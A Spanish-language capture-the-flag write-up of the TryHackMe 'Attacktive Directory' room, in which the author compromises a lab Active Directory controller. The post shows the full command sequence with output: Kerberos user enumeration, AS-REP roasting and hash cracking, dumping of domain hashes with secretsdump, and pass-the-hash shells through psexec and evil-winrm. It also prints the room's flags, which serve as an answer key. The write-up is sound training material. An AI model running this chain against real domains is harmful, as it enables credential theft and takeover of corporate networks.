---
layout: single
title: Attacktive Directory - TryHackMe
excerpt: "En este Room de Tryhackme de dificultad media vamos a resolver un Entorno de Active Directory donde nos dicen que el 99 % de las redes empresariales se basan en Active Directory y hacen la pregunta que si se puede explotar un AD vulnerable, en el room te dan informacion de como instalar las herramientas de impacket , Bloodhound y Neo4j, pero no son necesarios ya que solo tendremos que utilizar herramientas de impacket y kerberos para ganar acceso al sistema"
date: 2023-03-10
classes: wide
header:
  teaser: /assets/images/try-writeup-ad/icon.png
  teaser_home_page: true
  icon: /assets/images/tryhackme.webp
categories:
  - TryHackMe
  - infosec
tags:  
  - Active Directory
  - Kerberos User Enumeration
  - Hash NTLM
---

<p align="center">
<img src="/assets/images/try-writeup-ad/icon.png">
</p>

```bash
❯ ping -c 1 10.10.220.144
PING 10.10.220.144 (10.10.220.144) 56(84) bytes of data.
64 bytes from 10.10.220.144: icmp_seq=1 ttl=125 time=316 ms

--- 10.10.220.144 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 316.372/316.372/316.372/0.000 ms
❯ whichSystem.py 10.10.220.144

10.10.220.144 (ttl -> 125): Windows
```

## PortScan

```bash
❯ nmap -sCV -p53,80,135,139,445,3389,47001,49665,49692,88,636,389 10.10.220.144 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-10 12:58 CST
Nmap scan report for 10.10.220.144
Host is up (0.31s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-03-10 18:58:43Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-03-10T18:59:57+00:00; -3s from scanner time.
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2023-03-09T18:40:18
|_Not valid after:  2023-09-08T18:40:18
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
49665/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -3s, deviation: 0s, median: -4s
| smb2-time: 
|   date: 2023-03-10T18:59:47
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
```

Con la herramienta `crackmapexec` vemos que estamos ante un `Windows 10` ademas vemos el nombre del dominio asi que lo podemos agregar al `/etc/hosts`

```bash
❯ crackmapexec smb 10.10.220.144
SMB         10.10.220.144   445    ATTACKTIVEDIREC  [*] Windows 10.0 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
```

```bash
❯ echo "10.10.220.144 spookysec.local" | sudo tee -a /etc/hosts
10.10.220.144 spookysec.local
```

```bash
❯ catn /etc/hosts | tail -n 1
10.10.220.144 spookysec.local
```

Funciona

```bash
❯ ping -c 1 spookysec.local
PING spookysec.local (10.10.220.144) 56(84) bytes of data.
64 bytes from spookysec.local (10.10.220.144): icmp_seq=1 ttl=125 time=213 ms

--- spookysec.local ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 213.160/213.160/213.160/0.000 ms
```

## Enumeracion

No vemos nada

```bash
❯ smbclient -N -L 10.10.220.144
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available
```

En el `Room` mencionan el uso de `kerberos` asi que vamos a usarlo para enumerar usuarios del Dominio

<https://github.com/ropnop/kerbrute/releases>

```bash
❯ ./kerbrute -h

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 03/10/23 - Ronnie Flathers @ropnop

This tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.
It is designed to be used on an internal Windows domain with access to one of the Domain Controllers.
Warning: failed Kerberos Pre-Auth counts as a failed login and WILL lock out accounts

Usage:
  kerbrute [command]

Available Commands:
  bruteforce    Bruteforce username:password combos, from a file or stdin
  bruteuser     Bruteforce a single user's password from a wordlist
  help          Help about any command
  passwordspray Test a single password against a list of users
  userenum      Enumerate valid domain usernames via Kerberos
  version       Display version info and quit

Flags:
      --dc string       The location of the Domain Controller (KDC) to target. If blank, will lookup via DNS
      --delay int       Delay in millisecond between each attempt. Will always use single thread if set
  -d, --domain string   The full domain to use (e.g. contoso.com)
  -h, --help            help for kerbrute
  -o, --output string   File to write logs to. Optional.
      --safe            Safe mode. Will abort if any user comes back as locked out. Default: FALSE
  -t, --threads int     Threads to use (default 10)
  -v, --verbose         Log failures and errors

Use "kerbrute [command] --help" for more information about a command.
```

Estos fueron los usuarios creo que si quieres tener kerbrute instalado en vez de usar un binario como yo lo hice tienes que instalarlo mediante `go` en el repositorio te explican como hacerlo

```bash
❯ ./kerbrute userenum /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt -d spookysec.local --dc 10.10.220.144

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 03/10/23 - Ronnie Flathers @ropnop

2023/03/10 13:31:36 >  Using KDC(s):
2023/03/10 13:31:36 >  	10.10.220.144:88

2023/03/10 13:31:37 >  [+] VALID USERNAME:	svc-admin@spookysec.local
2023/03/10 13:31:37 >  [+] VALID USERNAME:	james@spookysec.local
2023/03/10 13:31:46 >  [+] VALID USERNAME:	James@spookysec.local
2023/03/10 13:31:48 >  [+] VALID USERNAME:	robin@spookysec.local
2023/03/10 13:32:09 >  [+] VALID USERNAME:	darkstar@spookysec.local
2023/03/10 13:32:20 >  [+] VALID USERNAME:	administrator@spookysec.local
2023/03/10 13:32:44 >  [+] VALID USERNAME:	backup@spookysec.local
2023/03/10 13:32:55 >  [+] VALID USERNAME:	paradox@spookysec.local
```

Vamos a agregar a los usuarios a una lista

```bash
❯ catn users.txt
svc-admin
james
robin
darkstar
administrator
backup
paradox
```

Vamos a ver si podemos obtener algun hash de algun usuario usando un `asrproast attack` 

<https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast>

El usuario `svc-admin` nos da un hash vamos a crackearlo

```bash
❯ impacket-GetNPUsers -no-pass -usersfile users.txt spookysec.local/
Impacket v0.10.1.dev1+20230207.122134.c812d6c7 - Copyright 2022 Fortra

$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:acfcce60f5ae4881863e6efb62a3729e$37b3323cb36a9e16fc3a82ed1cd3c7655e2477984c156a615fa1bf12fbd93d9fcf1ef1c7e703a59e22b0b1cff66bd6a177dd101c912f6ca9dded09062561cc367ee3472cc13b90336b0eefceae17f72028d2a4b04da1dfa698c41dd5bede2d901f5a2c7b131be02a98dc79ec392925a9a4117d4c2aefb55e705ad2a65acb449f57177308960b8a19bc84ba72cba5b7ad57029f46705169bfb36397c699cccc2256dd6bbca82ff8a09a5008672362ab2fbf0c5eda0ec3977e5085e52f5f09a118765e00ef34e29947767c1481ed0084d7a31e7c116ea011470087a41ec986c858e418e68f8c3a6eccdbddb67d30772191f1f1
[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paradox doesn't have UF_DONT_REQUIRE_PREAUTH set
```

```bash
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
management2005   ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL)
1g 0:00:00:11 DONE (2023-03-10 13:38) 0.08539g/s 498533p/s 498533c/s 498533C/s manaia05..man3333
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

`svc-admin:management2005`

Como tenemos credenciales podemos usarlas para ver recursos compartidos

```bash
❯ smbmap -H 10.10.220.144 -u svc-admin -p management2005
[+] IP: 10.10.220.144:445	Name: spookysec.local                                   
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	backup                                            	READ ONLY	
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
```

Otra forma de hacerlo es con `crackmapexec`

```bash
❯ crackmapexec smb 10.10.220.144 -u svc-admin -p management2005 --shares
SMB         10.10.220.144   445    ATTACKTIVEDIREC  [*] Windows 10.0 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
SMB         10.10.220.144   445    ATTACKTIVEDIREC  [+] spookysec.local\svc-admin:management2005 
SMB         10.10.220.144   445    ATTACKTIVEDIREC  [+] Enumerated shares
SMB         10.10.220.144   445    ATTACKTIVEDIREC  Share           Permissions     Remark
SMB         10.10.220.144   445    ATTACKTIVEDIREC  -----           -----------     ------
SMB         10.10.220.144   445    ATTACKTIVEDIREC  ADMIN$                          Remote Admin
SMB         10.10.220.144   445    ATTACKTIVEDIREC  backup          READ            
SMB         10.10.220.144   445    ATTACKTIVEDIREC  C$                              Default share
SMB         10.10.220.144   445    ATTACKTIVEDIREC  IPC$            READ            Remote IPC
SMB         10.10.220.144   445    ATTACKTIVEDIREC  NETLOGON        READ            Logon server share 
SMB         10.10.220.144   445    ATTACKTIVEDIREC  SYSVOL          READ            Logon server share 
```

Vamos a conectarnos a `backup` por el nombre ya suena interesante

```bash
❯ smbclient //10.10.220.144/backup -U svc-admin --password management2005
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Apr  4 13:08:39 2020
  ..                                  D        0  Sat Apr  4 13:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 13:08:53 2020

		8247551 blocks of size 4096. 3636097 blocks available
smb: \> 
```

Vemos un archivo `backup_credentials.txt` nos lo vamos a descargar

```bash
smb: \> get backup_credentials.txt 
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```

Al parecer es `base64`

```bash
❯ cat backup_credentials.txt
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: backup_credentials.txt
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

```bash
❯ echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
backup@spookysec.local:backup2517860
```

Tenemos credenciales para el usuario `backup` 

`backup@apookysec.local:backup2517860`

Vamos a validarlas con `crackmapexec` para ver si son correctas, pero no nos dio `Pwn3d!` asi que vamos a tener que seguir enumerando

```bash
❯ crackmapexec smb 10.10.220.144 -u backup -p backup2517860
SMB         10.10.220.144   445    ATTACKTIVEDIREC  [*] Windows 10.0 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
SMB         10.10.220.144   445    ATTACKTIVEDIREC  [+] spookysec.local\backup:backup2517860 
```

Si nos vamos al `Task 7` nos dice que usemos `secretsdump.py` y nos dan la siguiente informacion util 

<span style="color:yellow">
Now that we have new user account credentials, we may have more privileges on the system than before. The username of the account "backup" gets us thinking. What is this the backup account to?
Well, it is the backup account for the Domain Controller. This account has a unique permission that allows all Active Directory changes to be synced with this user account. This includes password hashes
Knowing this, we can use another tool within Impacket called "secretsdump.py". This will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer. Exploiting this, we will effectively have full control over the AD Domain.
</span>

Sabiendo la informacion que nos esta dando podemos usar la herramienta

<https://github.com/fortra/impacket/blob/master/examples/secretsdump.py>

```bash
❯ impacket-secretsdump WORKGROUP/backup:backup2517860@10.10.220.144
Impacket v0.10.1.dev1+20230207.122134.c812d6c7 - Copyright 2022 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:86e6e1b7c4ed4e15fd9b30daa3511d0c:::
```

Tenemos el hash nt del usuairo `Administrator` que es el mas interesante asi que vamos a comprobar si es valido

`Administrator:0e0363213e37b94221497260b0bcb4fc`

Nos da `Pwn3d!`

```bash
❯ crackmapexec smb 10.10.220.144 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
SMB         10.10.220.144   445    ATTACKTIVEDIREC  [*] Windows 10.0 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
SMB         10.10.220.144   445    ATTACKTIVEDIREC  [+] spookysec.local\Administrator:0e0363213e37b94221497260b0bcb4fc (Pwn3d!)
```

Asi que ahora nos podemos conectar con `psexec` o con `evilwinrm` en mi caso para mi es mas comodo `evilwinrm` pero mostrare las 2 formas

```bash
❯ impacket-psexec WORKGROUP/Administrator@10.10.220.144 -hashes :0e0363213e37b94221497260b0bcb4fc
Impacket v0.10.1.dev1+20230207.122134.c812d6c7 - Copyright 2022 Fortra

[*] Requesting shares on 10.10.220.144.....
[*] Found writable share ADMIN$
[*] Uploading file hyGRKAAP.exe
[*] Opening SVCManager on 10.10.220.144.....
[*] Creating service mfPN on 10.10.220.144.....
[*] Starting service mfPN.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1490]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

```

```bash
❯ evil-winrm -i 10.10.220.144 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
thm-ad\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd C:\Users
*Evil-WinRM* PS C:\Users> 


```

Ahora necesitamos las `flags` para completar la maquina, para ahorrarnos tiempo vamos a buscar de forma recursiva por archivos que terminen en `.txt`

```bash
*Evil-WinRM* PS C:\Users> dir -recurse *.txt


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/4/2020  11:39 AM             32 root.txt


    Directory: C:\Users\backup\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/4/2020  12:19 PM             26 PrivEsc.txt


    Directory: C:\Users\backup.THM-AD\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/4/2020   1:08 PM             26 PrivEsc.txt


    Directory: C:\Users\svc-admin\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/4/2020  12:18 PM             28 user.txt.txt
```

`svc-admin`

```bash
*Evil-WinRM* PS C:\Users> type C:\Users\svc-admin\Desktop\user.txt.txt
TryHackMe{K3rb3r0s_Pr3_4uth}
*Evil-WinRM* PS C:\Users> 
```

`backup`

```bash
*Evil-WinRM* PS C:\Users> type C:\Users\backup\Desktop\PrivEsc.txt
TryHackMe{B4ckM3UpSc0tty!}
*Evil-WinRM* PS C:\Users> 
```

`Administrator`

```bash
*Evil-WinRM* PS C:\Users> type C:\Users\Administrator\Desktop\root.txt
TryHackMe{4ctiveD1rectoryM4st3r}
*Evil-WinRM* PS C:\Users> 
```

Si quisieras ver la interfaz grafica puedes usar `rdesktop`, solo cambia la contraseña al usuario administrador

![](/assets/images/try-writeup-ad/win.png)

<span style="color:yellow">
Respuestas de las preguntas para completar el room
</span>

![](/assets/images/try-writeup-ad/Task3.png)

![](/assets/images/try-writeup-ad/Task4.png)

![](/assets/images/try-writeup-ad/Task5.png)

![](/assets/images/try-writeup-ad/Task6.png)

![](/assets/images/try-writeup-ad/Task7.png)

![](/assets/images/try-writeup-ad/Task8.png)

